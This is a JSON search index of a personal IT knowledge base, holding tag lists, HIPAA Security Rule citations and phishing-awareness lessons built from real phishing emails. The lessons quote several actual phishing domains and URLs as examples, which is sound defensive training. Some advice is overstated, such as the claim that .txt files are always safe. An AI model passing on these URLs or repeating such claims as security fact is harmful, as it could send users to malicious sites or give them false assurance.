{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"tags/","title":"Tags","text":"<p>Following is a list of relevant tags:</p>"},{"location":"tags/#tag:net","title":".NET","text":"<ul> <li>            Batch Run          </li> </ul>"},{"location":"tags/#tag:api","title":"API","text":"<ul> <li>            Private GitHub Repo and Autohokey          </li> </ul>"},{"location":"tags/#tag:autohotkey","title":"AutoHotKey","text":"<ul> <li>            Private GitHub Repo and Autohokey          </li> </ul>"},{"location":"tags/#tag:c","title":"C","text":"<ul> <li>            PHP, OpenSSL and ftp_ssl_connect() on Win32          </li> </ul>"},{"location":"tags/#tag:c","title":"C#","text":"<ul> <li>            Batch Run          </li> <li>            C# .NET 2.0 Web Service - Sync + Async          </li> </ul>"},{"location":"tags/#tag:css","title":"CSS","text":"<ul> <li>            Firefox Lepton Pref          </li> </ul>"},{"location":"tags/#tag:commands","title":"Commands","text":"<ul> <li>            Command Prompt          </li> <li>            NMAP          </li> </ul>"},{"location":"tags/#tag:foxpro","title":"FoxPro","text":"<ul> <li>            GetHtml          </li> <li>            Label Printer (Showcase)          </li> <li>            SmtpTester          </li> <li>            UTFiles          </li> </ul>"},{"location":"tags/#tag:github","title":"Github","text":"<ul> <li>            Private GitHub Repo and Autohokey          </li> </ul>"},{"location":"tags/#tag:linux","title":"Linux","text":"<ul> <li>            Make OpenVPN DNS Work          </li> </ul>"},{"location":"tags/#tag:net","title":"NET","text":"<ul> <li>            C# .NET 2.0 Web Service - Sync + Async          </li> </ul>"},{"location":"tags/#tag:oop","title":"OOP","text":"<ul> <li>            Poll Voter          </li> </ul>"},{"location":"tags/#tag:onenote","title":"OneNote","text":"<ul> <li>            Engineering Template          </li> </ul>"},{"location":"tags/#tag:openssl","title":"OpenSSL","text":"<ul> <li>            PHP, OpenSSL and ftp_ssl_connect() on Win32          </li> </ul>"},{"location":"tags/#tag:openvpn","title":"OpenVPN","text":"<ul> <li>            Make OpenVPN DNS Work          </li> </ul>"},{"location":"tags/#tag:organization","title":"Organization","text":"<ul> <li>            Engineering Template          </li> </ul>"},{"location":"tags/#tag:outlook","title":"Outlook","text":"<ul> <li>            A Better \"Send to Mail Recipient\" With Outlook          </li> </ul>"},{"location":"tags/#tag:php","title":"PHP","text":"<ul> <li>            Image Mailer          </li> <li>            Image Resizer          </li> <li>            Monitor Folder With PHP          </li> <li>            PHP Ftp Backup Library          </li> <li>            PHP, OpenSSL and ftp_ssl_connect() on Win32          </li> </ul>"},{"location":"tags/#tag:powershell","title":"PowerShell","text":"<ul> <li>            Copy Files Remote          </li> <li>            Large File Sizes          </li> <li>            Memory Mapped File          </li> <li>            Monitor Service &amp; Restart          </li> <li>            Mutex          </li> <li>            Runspaces          </li> </ul>"},{"location":"tags/#tag:programming","title":"Programming","text":"<ul> <li>            Batch Run          </li> <li>            C# .NET 2.0 Web Service - Sync + Async          </li> <li>            Comcast Modem Power Level Monitor          </li> <li>            PHP, OpenSSL and ftp_ssl_connect() on Win32          </li> <li>            Poll Voter          </li> </ul>"},{"location":"tags/#tag:python","title":"Python","text":"<ul> <li>            Comcast Modem Power Level Monitor          </li> <li>            Poll Voter          </li> </ul>"},{"location":"tags/#tag:r","title":"R","text":"<ul> <li>            Comcast Modem Power Level Monitor          </li> </ul>"},{"location":"tags/#tag:smtp","title":"SMTP","text":"<ul> <li>            SmtpTester          </li> </ul>"},{"location":"tags/#tag:teamwork","title":"Teamwork","text":"<ul> <li>            Engineering Template          </li> </ul>"},{"location":"tags/#tag:winhttp","title":"WinHTTP","text":"<ul> <li>            GetHtml          </li> </ul>"},{"location":"tags/#tag:windows","title":"Windows","text":"<ul> <li>            A Better \"Send to Mail Recipient\" With Outlook          </li> </ul>"},{"location":"tags/#tag:appsec","title":"appsec","text":"<ul> <li>            Finding Sql Injection Through Code Analysis          </li> </ul>"},{"location":"tags/#tag:esxi","title":"esxi","text":"<ul> <li>            Rsync In ESXI          </li> </ul>"},{"location":"tags/#tag:java","title":"java","text":"<ul> <li>            Jvm Stuck Threads          </li> </ul>"},{"location":"tags/#tag:jvm","title":"jvm","text":"<ul> <li>            Jvm Stuck Threads          </li> </ul>"},{"location":"tags/#tag:sqli","title":"sqli","text":"<ul> <li>            Finding Sql Injection Through Code Analysis          </li> </ul>"},{"location":"tags/#tag:tomcat","title":"tomcat","text":"<ul> <li>            Jvm Stuck Threads          </li> </ul>"},{"location":"kbase/","title":"Knowledge Base","text":"<p>This section is used as a repository of information. Item's collected over the years and may still be relevant.</p> <ul> <li>The Phishing Article was used as part of an internal security training page. This is a good guide and has some tips for training users about how to identify bad links and what to look for to spot phishing emails.</li> <li>The Pond (w Phish!) is a collection of real-world phishing emails and what to learn from them.</li> <li>HIPAA Rules are the rules that can be used to create company policies.</li> <li>Snippets is an area for quick reference of various things like code or commands. </li> </ul>"},{"location":"kbase/hipaa164/","title":"HIPAA Rules","text":"<p>2025-01-26 - New HIPAA Rules</p> <p>https://www.hhs.gov/hipaa/for-professionals/security/hipaa-security-rule-nprm/factsheet/index.html</p> <p>The following rules can be used to create HIPAA Policies &amp; Procedures for an organization.</p> <p>https://www.law.cornell.edu/cfr/text/45/part-164</p> <p>-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</p> <ol> <li> <p>HIPAA 164.308(a)(4)(i) Administrative Safeguards - Information Access Management</p> <p>Implement policies and procedures for authorizing access to electronic protected health information that are consistent with the applicable requirements of subpart E of this part.</p> </li> <li> <p>HIPAA 164.308(a)(5)(ii)(D) Administrative Safeguards - Password Management</p> <p>Procedures for creating, changing, and safeguarding passwords.</p> </li> <li> <p>HIPAA 164.310(a)(1) Physical Safeguards - Facility Access Controls</p> <p>Implement policies and procedures to limit physical access to its electronic information systems and the facility or facilities in which they are housed, while ensuring that properly authorized access is allowed.</p> </li> <li> <p>HIPAA164.310(b) Physical Safeguards - Workstation Use</p> <p>Implement policies and procedures that specify the proper functions to be performed, the manner in which those functions are to be performed, and the physical attributes of the surroundings of a specific workstation or class of workstation that can access electronic protected health information.</p> </li> <li> <p>HIPAA 164.310(d)(1) Physical Safeguards - Device and Media Controls</p> <p>Implement policies and procedures that govern the receipt and removal of hardware and electronic media that contain electronic protected health information into and out of a facility, and the movement of these items within the facility.</p> </li> <li> <p>HIPAA 164.308(a)(3)(ii)(A) Administrative Safeguards -Authorization and/or Supervision</p> <p>Implement procedures for the authorization and/or supervision of workforce members who work with electronic protected health information or in locations where it might be accessed.</p> </li> <li> <p>HIPAA 164.310(c) Physical Safeguards - Workstation Security</p> <p>Implement physical safeguards for all workstations that access electronic protected health information, to restrict access to authorized users.</p> </li> <li> <p>HIPAA 164.312(c)(1) Technical Safeguards \u2013 Integrity</p> <p>Implement policies and procedures to protect electronic protected health information from improper alteration or destruction.</p> </li> <li> <p>HIPAA 164.308(a)(2) Administrative Safeguards -Assigned Security Responsibility</p> <p>Identify the security official who is responsible for the development and implementation of the policies and procedures required by this subpart for the covered entity or business associate.</p> </li> <li> <p>HIPAA 164.312(a)(2)(iii) Technical Safeguards -Automatic Logoff</p> <p>Implement electronic procedures that terminate an electronic session after a predetermined time of inactivity.</p> </li> <li> <p>HIPAA 164.308(a)(1)(ii)(C) Administrative Safeguards - Sanction Policy</p> <p>Apply appropriate sanctions against workforce members who fail to comply with the security policies and procedures of the covered entity or business associate.</p> </li> <li> <p>HIPAA 164.308(a)(1)(i) Administrative Safeguards - Security Management Process</p> <p>Implement policies and procedures to prevent, detect, contain, and correct security violations.</p> </li> <li> <p>HIPAA 164.316(b)(2)(iii) Policies and Procedures and Documentation Requirements \u2013 Updates</p> <p>Review documentation periodically, and update as needed, in response to environmental or operational changes affecting the security of the electronic protected health information.</p> </li> <li> <p>HIPAA 164.316(b)(2)(ii) Policies and Procedures and Documentation Requirements \u2013 Availability</p> <p>Make documentation available to those persons responsible for implementing the procedures to which the documentation pertains.</p> </li> <li> <p>HIPAA 164.308 (a)(3)(i) Administrative Safeguards - Workforce Security</p> <p>Implement policies and procedures to ensure that all members of its workforce have appropriate access to electronic protected health information, as provided under paragraph (a)(4) of this section, and to prevent those workforce members who do not have access under paragraph (a)(4) of this section from obtaining access to electronic protected health information.</p> </li> <li> <p>HIPAA 164.310(a)(2)(iii) Physical Safeguards -Access Control and Validation Procedures</p> <p>Implement procedures to control and validate a person's access to facilities based on their role or function, including visitor control, and control of access to software programs for testing and revision.</p> </li> <li> <p>HIPAA 164.308(a)(4)(ii)(C) Administrative Safeguards - Access Establishment and Modification</p> <p>Implement policies and procedures that, based upon the covered entity's or the business associate's access authorization policies, establish, document, review, and modify a user's right of access to a workstation, transaction, program, or process.</p> </li> <li> <p>HIPAA 164.308(a)(3)(ii)(B) Administrative Safeguards - Workforce Clearance Procedure</p> <p>Implement procedures to determine that the access of a workforce member to electronic protected health information is appropriate. </p> </li> <li> <p>HIPAA 164.312(a)(1) Technical Safeguards -Access Control</p> <p>Implement technical policies and procedures for electronic information systems that maintain electronic protected health information to allow access only to those persons or software programs that have been granted access rights as specified in \u00a7164.308(a)(4).</p> </li> <li> <p>HIPAA 164.312(b) Technical Safeguards - Audit Controls</p> <p>Implement hardware, software, and/or procedural mechanisms that record and examine activity in information systems that contain or use electronic protected health information.</p> </li> <li> <p>HIPAA 164.312(e)(2)(i) Technical Safeguards - Integrity Controls</p> <p>Implement security measures to ensure that electronically transmitted electronic protected health information is not improperly modified without detection until disposed of.</p> </li> <li> <p>HIPAA 164.308(a)(5)(ii)(C) Administrative Safeguards - Log-in Monitoring</p> <p>Procedures for monitoring log-in attempts and reporting discrepancies.</p> </li> <li> <p>HIPAA 164.308(a)(3)(ii)(A) Administrative Safeguards - Authorization and/or Supervision</p> <p>Implement procedures for the authorization and/or supervision of workforce members who work with electronic protected health information or in locations where it might be accessed.</p> </li> <li> <p>HIPAA 164.308(a)(4)(ii)(B) Administrative Safeguards - Access Authorization</p> <p>Implement policies and procedures for granting access to electronic protected health information, for example, through access to a workstation, transaction, program, process, or other mechanism.</p> </li> <li> <p>HIPAA 164.312(a)(2)(ii) Technical Safeguards - Emergency Access Procedure</p> <p>Establish (and implement as needed) procedures for obtaining necessary electronic protected health information during an emergency.</p> </li> <li> <p>HIPAA 164.312(a)(2)(i) Technical Safeguards - Unique User Identification</p> <p>Assign a unique name and/or number for identifying and tracking user identity.</p> </li> <li> <p>HIPAA 164.312(d) Technical Safeguards - Person or Entity Authentication</p> <p>Implement procedures to verify that a person or entity seeking access to electronic protected health information is the one claimed.</p> </li> <li> <p>HIPAA 164.308(a)(7)(ii)(A) Administrative Safeguards - Data Backup Plan</p> <p>Establish and implement procedures to create and maintain retrievable exact copies of electronic protected health information.</p> </li> <li> <p>HIPAA 164.310(d)(2)(iv) Physical Safeguards - Data Backup and Storage</p> <p>Create a retrievable, exact copy of electronic protected health information, when needed, before movement of equipment.</p> </li> <li> <p>HIPAA 164.308(a)(7)(ii)(E) Administrative Safeguards - Applications and Data Criticality Analysis</p> <p>Assess the relative criticality of specific applications and data in support of other contingency plan components.</p> </li> <li> <p>HIPAA 164.312(a)(2)(iv) Technical Safeguards - Encryption and Decryption</p> <p>Implement a mechanism to encrypt and decrypt electronic protected health information.</p> </li> <li> <p>HIPAA 164.312(e)(2)(ii) Technical Safeguards \u2013 Encryption</p> <p>Implement a mechanism to encrypt electronic protected health information whenever deemed appropriate.</p> </li> <li> <p>HIPAA 164.310(d)(2)(i) Physical Safeguards - Disposal</p> <p>Implement policies and procedures that govern the receipt and removal of hardware and electronic media that contain electronic protected health information into and out of a facility, and the movement of these items within the facility.</p> </li> <li> <p>HIPAA 164.308(a)(5)(ii)(B) Administrative Safeguards - Protection from Malicious Software</p> <p>Procedures for guarding against, detecting, and reporting malicious software.</p> </li> <li> <p>HIPAA 164.308(a)(1)(ii)(B) Administrative Safeguards - Risk Management</p> <p>Implement security measures sufficient to reduce risks and vulnerabilities to a reasonable and appropriate level to comply with \u00a7164.306(a).</p> </li> <li> <p>HIPAA 164.310(d)(2)(ii) Media Protection - Media Re-use</p> <p>Implement procedures for removal of electronic protected health information from electronic media before the media are made available for re-use.</p> </li> <li> <p>HIPAA 164.310(d)(2)(iii) Media Protection \u2013 Accountability</p> <p>Maintain a record of the movements of hardware and electronic media and any person responsible, therefore.</p> </li> <li> <p>HIPAA164.308 (a)(6)(i) Administrative Safeguards - Security Incident Procedures</p> <p>Implement policies and procedures to address security incidents.</p> </li> <li> <p>HIPAA 164.308 (a)(1)(ii)(D) Administrative Safeguards - Information System Activity Review</p> <p>Implement procedures to regularly review records of information system activity, such as audit logs, access reports, and security incident tracking reports.</p> </li> <li> <p>HIPAA 164.308 (a)(6)(ii) Administrative Safeguards - Response and Reporting</p> <p>Identify and respond to suspected or known security incidents; mitigate, to the extent practicable, harmful effects of security incidents that are known to the covered entity or business associate; and document security incidents and their outcomes.</p> </li> <li> <p>HIPAA 164.308 (a)(5)(ii)(A) Administrative Safeguards - Security Reminders</p> <p>Periodic security updates.</p> </li> <li> <p>HIPAA 164.314 (a)(2)(i) Organizational Requirements - Business Associate Contracts</p> <p>The contract must provide that the business associate will:      \u2022 Comply with the applicable requirements of this subpart;     \u2022 In accordance with \u00a7164.308(b)(2), ensure that any subcontractors that create, receive, maintain, or transmit electronic   protected health information on behalf of the business associate agree to comply with the applicable requirements of this subpart by entering into a contract or other arrangement that complies with this section; and     \u2022 Report to the covered entity any security incident of which it becomes aware, including breaches of unsecured protected health information as required by 164.410.</p> </li> <li> <p>HIPAA 164.308 (a)(8) Administrative Safeguards \u2013 Evaluation</p> <p>Perform a periodic technical and nontechnical evaluation, based initially upon the standards implemented under this rule and, subsequently, in response to environmental or operational changes affecting the security of electronic protected health information, that establishes the extent to which a covered entity's or business associate's security policies and procedures meet the requirements of this subpart.</p> </li> <li> <p>HIPAA 164.316 (b)(2)(i) Policies and Procedures and Documentation Requirements - Time Limit</p> <p>Retain the documentation required by paragraph (b)(l) of this section for 6 years from the date of its creation or the date when it last was in effect, whichever is later.</p> </li> <li> <p>HIPAA 164.308(a)(5)(i) Administrative Safeguards - Security Awareness and Training</p> <p>Implement a security awareness and training program for all members of its workforce (including management).</p> </li> <li> <p>HIPAA 164.308(a)(7)(ii)(D) Administrative Safeguards - Testing and Revision Procedures</p> <p>Implement procedures for periodic testing and revision of contingency plans.</p> </li> <li> <p>HIPAA 164.308 (a)(1)(ii)(A) Administrative Safeguards - Risk Analysis</p> <p>Conduct an accurate and thorough assessment of the potential risks and vulnerabilities to the confidentiality, integrity, and availability of electronic protected health information held by the covered entity or business associate.</p> </li> <li> <p>HIPAA 164.308(b)(1) Administrative Safeguards - Business Associate Contracts and Other Arrangements</p> <p>A covered entity may permit a business associate to create, receive, maintain, or transmit electronic protected health information on the covered entity's behalf only if the covered entity obtains satisfactory assurances, in accordance with \u00a7164.314(a), that the business associate will appropriately safeguard the information. A covered entity is not required to obtain such satisfactory assurances from a business associate that is a subcontractor.</p> </li> <li> <p>HIPAA 164.308 (b)(3) Administrative Safeguards - Written Contract or Other Arrangement</p> <p>Document the satisfactory assurances required by paragraph (b)(l) or (b)(2) of this section through a written contract or other arrangement with the business associate that meets the applicable requirements of \u00a7164.314(a).</p> </li> <li> <p>HIPAA 164.308 (b)(2) Administrative Safeguards</p> <p>A business associate may permit a business associate that is a subcontractor to create, receive, maintain, or transmit electronic protected health information on its behalf only if the business associate obtains satisfactory assurances, in accordance with \u00a7164.314(a), that the subcontractor will appropriately safeguard the information. </p> </li> <li> <p>HIPAA 164.314 (a)(2)(i)(B) Organizational Requirements</p> <p>In accordance with \u00a7164.308(b)(2), ensure that any subcontractors that create, receive, maintain, or transmit electronic protected health information on behalf of the business associate agree to comply with the applicable requirements of this subpart by entering into a contract or other arrangement that complies with this section</p> </li> <li> <p>HIPAA 164.314 (a)(2)(i)(C) Organizational Requirements</p> <p>Report to the covered entity any security incident of which it becomes aware, including breaches of unsecured protected health information as required by \u00a7 164.410.</p> </li> <li> <p>HIPAA 164.314 (a)(2)(iii) Organizational Requirements - Business Associate Contracts with Subcontractors</p> <p>The requirements of paragraphs (a)(2)(i) and (a)(2)(ii) of this section apply to the contract or other arrangement between a business associate and a subcontractor required by \u00a7164.308 (b)(4) in the same manner as such requirements apply to contracts or other arrangements between a covered entity and business associate.</p> </li> <li> <p>HIPAA 164.314 (a)(1) Organizational Requirements - Business Associate Contracts or Other Arrangements</p> <p>The contract or other arrangement required by \u00a7164.308(b)(3) must meet the requirements of paragraph (a)(2)(i), (a)(2)(ii), or (a)(2)(iii) of this section, as applicable. </p> </li> </ol>"},{"location":"kbase/malphish/","title":"Phishing","text":"<p>Important</p> <p>If you believe you have received a phishing email, you need to stop and not proceed with any action like clicking links or entering sensitive information or even clicking [X] to close a window. Simply stop all actions and report it to your IT/Security/Support Department immediatly.</p> <p>Phishing is a cybercrime in which a target or targets are contacted by email, telephone or text message by someone posing as a legitimate institution to lure individuals into providing sensitive data such as personally identifiable information, banking and credit card details, and passwords.</p> <p>The information is then used to access important accounts and can result in identity theft and financial loss.</p>"},{"location":"kbase/malphish/#common-features-of-phishing-emails","title":"Common Features of Phishing Emails","text":"<ul> <li> <p>Too Good To Be True - Lucrative offers and eye-catching or attention-grabbing statements are designed to attract people\u2019s attention immediately. For instance, many claim that you have won an iPhone, a lottery, or some other lavish prize. Just don't click on any suspicious emails. Remember that if it seems to good to be true, it probably is!</p> </li> <li> <p>Sense of Urgency - A favorite tactic amongst cybercriminals is to ask you to act fast because the super deals are only for a limited time. Some of them will even tell you that you have only a few minutes to respond. When you come across these kinds of emails, it's best to just ignore them. Sometimes, they will tell you that your account will be suspended unless you update your personal details immediately. Most reliable organizations give ample time before they terminate an account and they never ask patrons to update personal details over the Internet. When in doubt, visit the source directly rather than clicking a link in an email.</p> </li> <li> <p>Links - A link may not be all it appears to be. Hovering over a link shows you the actual URL where you will be directed upon clicking on it. It could be completely different or it could be a popular website with a misspelling, for instance www.bankofarnerica.com - the 'm' is actually an 'r' and an 'n', so look carefully.</p> </li> <li> <p>Attachments - If you see an attachment in an email you weren't expecting or that doesn't make sense, don't open it! They often contain payloads like ransomware or other viruses. The only file type that is always safe to click on is a .txt file.</p> </li> <li> <p>Unusual Sender - Whether it looks like it's from someone you don't know or someone you do know, if anything seems out of the ordinary, unexpected, out of character or just suspicious in general don't click on it!</p> </li> </ul> <p></p> Click To View Larger Image"},{"location":"kbase/malphish/#what-you-must-do","title":"What You Must Do","text":"<ul> <li> <p>In short, always do four (4) simple things:</p> <ul> <li> Don\u2019t just click.</li> <li> Investigate the link and identify the target.</li> <li> Trust your gut.</li> <li> Report anything out of the ordinary or you feel is suspicious. </li> </ul> </li> <li> <p>This applies to all types of links whether it\u2019s in an email or on a webpage or when you are doing a search.</p> </li> <li> <p>It\u2019s very easy to forget to do these things during the course of a busy work day, but just take a moment, that\u2019s all it takes.</p> </li> <li> <p>In many cases you may need to call the person sending you the email to verify the email is legitimate.</p> </li> <li> <p>In most cases, you don't need to click links in emails as you can go directly to the website. For example, if you receive an email from Amazon.com asking to click a link to update your profile, you are much safer FIRST browsing to Amazon.com and logging in to your account and then making changes, therefor bypassing any links in an email.</p> </li> </ul>"},{"location":"kbase/malphish/#links-or-urls","title":"Links or URLs","text":""},{"location":"kbase/malphish/#main-components","title":"Main Components","text":""},{"location":"kbase/malphish/#three-slashes-and-youre-out","title":"Three slashes and you're out!","text":"<p>Well, actually you're safe... but this method will help you in almost all cases identify a bad link from a good one. </p> <p>Because emails can come from compromised accounts of someone you do business with on a regular basis, the email by itself is no longer a good way to judge if the message is a scam. </p> <p>The only way is to understand the link the scammer wants you to visit.</p> <p>This method makes it really easy and fast to understand a link and better determine a good one from a bad one:</p>"},{"location":"kbase/malphish/#example-1","title":"Example 1","text":"<ul> <li>In any link or web address count the first three forward slashes. Numbers 1, 2 &amp; 3 above...</li> <li>Starting at the third slash, work backwards to the first dot. The red underline. This is the \".com\" part of the address or Top Level Domain, like .net, .us, .org.</li> <li>If you work further backwards, that's the domain, or target of the link.</li> <li>In the example above, <code>criticismwaitlist0k112w.com</code> is the target - this is not a common domain.</li> </ul>"},{"location":"kbase/malphish/#example-2","title":"Example 2","text":"<ul> <li>Count the first three forward slashes. #'s 1, 2 &amp; 3.</li> <li>At the third, work backwards (orange arrows) and find the first dot. Orange #1 - that's the Top Level Domain.</li> <li>Further back is the word <code>dummies</code> - this is the target or domain.</li> <li>In this case <code>dummies.com</code> is the target.</li> </ul>"},{"location":"kbase/malphish/#subject-lines-to-look-out-for","title":"Subject Lines To Look Out For","text":"<p>A good exercise to go through with your team members is to have them create a list of the top 5 or 10 subject lines they work with on a regular basis that they typically have to take action on.</p> <p>These subject lines that are almost routine, especially in areas of the business that are repetative in nature like accounts receivables or payroll, etc.</p> <p>The act of going through this exercise will allow team members to realize that any one of those subject lines could potentially be turned into a phishing emai, and that even though they are familiar, they should always question what they are being asked to do. </p> Subject Lines To Look Out For Personal and Confidental New File Alert Renewal Update Spreadsheet attached Waiting for your response Rush - RFP Overdue Payment Due tomorrow if possible Revised documents Monthly Reporting Quote 001 Claims Status"},{"location":"kbase/malphish/#example-of-phishing-emails","title":"Example of Phishing Emails","text":"<p>Please take a visit \"down by the pond\" to look at all the Phish!</p>"},{"location":"kbase/pond/phish001/","title":"Example Phish 001","text":"<p>Quote</p> <p>\u201cHaving a fishing rod in your hand is merely an excuse to explore out-of-sight depths and reveal mysteries that previously only existed in dreams.\u201d \u2013 Fennel Hudson  </p>"},{"location":"kbase/pond/phish001/#what-to-learn-from-this-phish","title":"What to learn from this phish...","text":"<ul> <li>The email itself is legitimate. In fact, it could come from a well known email address that you are familiar with.</li> <li>The link is to a fake clone of a legitimate website to make you think it was the correct site to enter your login credentials.</li> <li>criticismwaitlist0k112w.com is the target of the link. This site is not a common site where you'd go to download files.</li> <li>The message appears to be a notification message created by Office 365, yet it goes to a strange website.</li> </ul>"},{"location":"kbase/pond/phish002/","title":"Example Phish 002","text":"<p>Quote</p> <p>\u201cSharing the fun of fishing turns strangers into friends in a few hours.\u201d \u2013 Eugene Clark</p>"},{"location":"kbase/pond/phish002/#what-to-learn-from-this-phish","title":"What to learn from this phish...","text":"<p>From address can't be trusted.</p> <ul> <li>The below is an actual, legitimate address Amazon uses. This can be replaced inside the email and faked very easily. </li> <li> <p>Allow-listing needs to be used with caution for this very reason, especially if the users themselves have \"Allow-listing\" capabilities.</p> <p></p> </li> <li> <p>If the user who receives this message has the From address allow-listed in their spam filter it would allow the message to bypass some checks, including a link check.</p> </li> </ul>"},{"location":"kbase/pond/phish002/#hover-over-links-before-you-click","title":"Hover over links before you click.","text":"<ul> <li>By hovering over the link, you can idenfity the target and see it does not go to Amazon.com.</li> </ul>"},{"location":"kbase/pond/phish003/","title":"Example Phish 003","text":"<p>Quote</p> <p>\u201cGive a man a fish and you feed him for a day. Teach a man to fish and you feed him for a lifetime.\u201c \u2013 Anne Ritchie</p>"},{"location":"kbase/pond/phish003/#what-to-learn-from-this-phish","title":"What to learn from this phish...","text":"<p>This is a phishing email, but it's important to understand that it first sends you to a legitimate site and then presents you with the \"bad\" links. </p> <p>It's a trick to gain confidence and hope recipients will check the first link, but not the second. It can bypass link checkers and it's more familiar as many people these days use online file sharing systems like One Drive, DropBox, Box.com, etc.</p> <ul> <li>Take notice of the 3 slashes and the first dot working backwards from the 3d slash. </li> <li>domain DOT top-level domain</li> </ul> <p>Link 1 - in the email itself</p> <ul> <li> <p>Goes to a Microsoft owned site and used for One Drive - their online storage tool.</p> <p><code>https://1drv.ms/o/s!BLxmgMJTuVFSg04kemTfxAVt9c0q?e=7QptPY_IkEGxiDD17o3TzQ&amp;at=9</code></p> <p></p> </li> </ul> <p>Link 2 - at the One Drive webpage</p> <ul> <li> <p>It's a web version of a OneNote note that has two files in it with two links, both to the same place.</p> <p><code>https://ademarojaya.com/36crime.co.uk.abm.com/sigtthed94/IIve</code></p> <p></p> </li> <li> <p>Unless <code>ademarojaya.com</code> is something you recognize, this is not a legitimate link, site, or email.</p> </li> </ul>"},{"location":"kbase/pond/phish003/#best-course-of-action","title":"Best Course of Action","text":"<p>Delete email, call sender. Never reply to emails for verification and always double check the phone number before calling it.</p>"},{"location":"kbase/pond/phish004/","title":"Example Phish 004","text":"<p>Quote</p> <p>\u201cMany men go fishing all of their lives without knowing that it is not fish they are after.\u201d \u2013 Henry David Thoreau</p>"},{"location":"kbase/pond/phish004/#what-to-learn-from-this-phish","title":"What to learn from this phish...","text":"<p>Subject line: \u201cActivity Limited\u201d.</p> <p>This could come in on your mobile app. Imagine you made recent changes to your PayPal account just a few days prior. You knew everything was in order, but best to manually open the PayPal app to check anyway. (without clicking links!)</p> <p>Sometimes you can long press on a link from your phone to reveal the address without going to it. </p>"},{"location":"kbase/pond/phish004/#sure-enough","title":"Sure Enough","text":"<p>\u2026if you do, you'd see:</p> <p>\u201cAppeal This Decision\u201d goes to: <code>https://tekworthconsult.com/myaccount</code></p> <p></p>"},{"location":"kbase/pond/phish005/","title":"Example Phish 005","text":"<p>Quote</p> <p>\"There is certainly something in angling that tends to produce a serenity of the mind.\u201d \u2013 Washington Irving</p>"},{"location":"kbase/pond/phish005/#what-to-learn-from-this-phish","title":"What to learn from this phish...","text":"<p>You might receive something like this: </p> <p></p>"},{"location":"kbase/pond/phish005/#everything-checks-out","title":"Everything Checks Out","text":"<ul> <li>Notice the Subject line \u2013 appropriate, applicable</li> <li>Notice the Target of the link \u2013 box.com (legitimate link)</li> </ul>"},{"location":"kbase/pond/phish005/#what-would-happen-if-you-click-the-link","title":"What would happen if you click the link?","text":"<p>In this case, not much. It\u2019s a legitimate link. !!It\u2019s the next link that\u2019s the problem!!</p> <p>Please read the text in the image below:</p> <p></p>"},{"location":"kbase/pond/phish006/","title":"Example Phish 006","text":"<p>Quote</p> <p>\u201cFishing is not an escape from life, but often a deeper immersion into it.\u201d \u2013 Harry Middleton</p>"},{"location":"kbase/pond/phish006/#what-to-learn-from-this-phish","title":"What to learn from this phish...","text":"<p>Look for clues! Wording &amp; Links look ok?</p> <ul> <li>Wording\u2026 OK</li> </ul> <p>Looks fine. No strange punctuation or use of strange words.</p> <ul> <li>Links\u2026 NOT SO MUCH\u2026.</li> </ul> <p>Hover over each link to reveal it. Notice the target: bit.ly &amp; jmp.sh\u2026 this is enough to stop and ask for help\u2026 read on to learn more!</p> <p></p> <p>These are known as URL shortners. They take a long link/url and make it shorter to avoid clutter, BUT they also mask the actual link which is a nice trick!!</p> <p>How can you see where the short link goes?</p> <p>Not all shortners support this, but for bit.ly links you can see the ACTUAL url by simply appending a \u201c+\u201d sign after the link.</p> <p>You can right-click on the link and choose, Copy Hyperlink.</p> <p></p> <p>Paste the Hyperlink/Link/URL in your browsers address bar and append the \u201c+\u201d sign:</p> <p></p> <p>Bitly will show you the actual link, and even give you statistics on how many times it was clicked. Notice how many clicks there were!!! That\u2019s scary!</p> <p></p> <p>This is a similar link as the scam from a few days ago! Different file, same steps through the scam.</p> <p>If you follow that link you would be taken to a legitimate file on Sync.com. This should look VERY familiar!</p> <p></p> <p>If you open the document you are presented with another LINK. Again\u2026familiar?</p> <p>Bad link!! just line in the last scam!</p> <p></p>"},{"location":"kbase/pond/phish007/","title":"Example Phish 007","text":"<p>Quote</p> <p>\u201cThere are always new places to go fishing. For any fisherman, there\u2019s always a new place, always a new horizon.\u201d \u2013 Jack Nicklaus</p>"},{"location":"kbase/pond/phish007/#what-to-learn-from-this-phish","title":"What to learn from this phish...","text":"<p>The links (1), (2), and (3) all go to their intended target, sync.com. (Sync.com is a legitimate file sharing service.)</p> <p>There are no misspellings or anything that would give you any clues - everything just looks right. </p> <p>The truth is, this actually is a legitimate email from Sync.com. </p> <p>The scam is actually in the file that was sent!</p> <p>To stop the scam at this point is hard, but not impossible. The only defense you have, is to constantly think: Why did this person send me a file with this title at this time? </p> <p>It may not be enough, but it just might prompt you to take evasive action. Try getting in the habit of asking yourself this. If something isn\u2019t quite right, call the sender. It might seem like a lot to do, but the truth is, if you eventually fall for the scam, you\u2019re going to call the sender anyway and it can be ten if not hundreds of times less than the possible downtime due to the scam.</p> <p>After clicking the link (#2) you would have been presented with the screen below:</p> <p></p> <p>Again, this is a legitimate page at this point. It\u2019s still part of Sync.com\u2019s system. You can see by the address bar that you are where the link said you would go. If you hover over the links on this page you would find they are all legitimate.</p> <p>If you made it to this point, there is nothing that would stop you from opening or downloading the file. Perhaps the title\u2026</p> <p>After opening the file you would see what\u2019s in the image below:</p> <p></p> <p>It looks pretty good. The logo at the top, the thumbnails of the document at the bottom, but there are many clues that should cause your Spidey Sense to Tingle!</p> <p>(1) First, the big, blue button. </p> <ul> <li> <p>You should not have to click buttons in PDF files for anything. Also, notice where you would go if you clicked the link? Doesn\u2019t that look phishy?</p> <p><code>http://x.co/24charge</code></p> </li> <li> <p>First off, you are being asked to review an important, \u201cvital\u201d file yet you are being taken to an unsecure website! Notice there is no \u201cS\u201d after the HTTP.</p> </li> <li> <p>Second, the target of that link has nothing to do with anything: X.CO is the target. I\u2019ve never needed to go to a website named \u201cX\u201d and I never need to use the \u201c.CO\u201d top-level domain. Usually it\u2019s .com, or .net, org, etc.</p> </li> </ul> <p>(2) Second, how often do people say this is an important, vital file for you to review? Maybe in a different context.</p> <p>(3) Third, this sentence just isn\u2019t correct. Also, why do I need to use my email credentials to open the document?</p> <p>At this point if you continue clicking the link you would have been taken to the website. On that website you would have been asked to authenticate with your \u201cProfessional Email Login Credential\u201d, OR for your convenience you could have used any one of your favorite logins to gain access: you could have logged on via, Gmail, Facebook, Twitter, etc. 